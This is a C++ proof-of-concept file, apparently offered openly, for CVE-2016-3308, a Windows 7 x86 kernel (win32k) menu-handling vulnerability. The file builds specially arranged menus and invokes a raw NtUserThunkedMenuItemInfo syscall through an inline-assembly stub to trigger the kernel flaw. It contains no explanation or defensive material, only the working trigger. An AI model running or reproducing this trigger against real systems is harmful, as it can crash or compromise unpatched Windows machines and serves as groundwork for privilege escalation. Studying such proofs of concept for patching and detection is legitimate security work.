/*
* [+] cve-2016-3308:
* [+] It just a poc.
* [+] Test version: windows 7 x86
* [+] It should work, But you need to to execute it more once(maybe)
* [+] By wjllz
*/
#include <iostream>
#include <Windows.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

HMENU hMenu = NULL;
_declspec(naked) BOOL NtUserThunkedMenuItemInfo(
	IN HMENU hMenu,
	IN UINT nPosition,
	IN BOOL fByPosition,
	IN BOOL fInsert,
	IN LPMENUITEMINFOW lpmii OPTIONAL,
	IN PUNICODE_STRING pstrItem OPTIONAL,
	IN BOOL fAnsi)
{
	__asm
	{
		mov     eax, 1256h
		mov     edx, 7ffe0300h
		call    dword ptr[edx]
		ret     18h
	}
}

int main()
{
	HMENU hMenu = CreateMenu();
	HMENU hmenuPopup = CreateMenu();
	MENUITEMINFO mii = {};

	for (int i = 0; i < 0xF; i++)
	{
		mii.cbSize = sizeof(MENUITEMINFO);
		mii.fMask = MIIM_ID | MIIM_DATA | MIIM_SUBMENU | MIIM_BITMAP;
		mii.wID = (i == 6 ? 1 : 0x100 + i) ;
		mii.hSubMenu =(i == 0xE ? hmenuPopup : NULL);
		mii.hbmpItem = (i==7 ? (HBITMAP)1:NULL);
		InsertMenuItem(i < 7 ? hmenuPopup : hMenu, i < 7 ? i : i - 7, TRUE, &mii);
	}

	try 
	{
		// [+] trigger
		NtUserThunkedMenuItemInfo(hMenu, 0x107, FALSE, TRUE, (LPMENUITEMINFOW)&mii, NULL, 0);
	}
	catch (const char* msg) 
	{
    		std::cerr << msg << std::endl;
	}
	return 0;
}
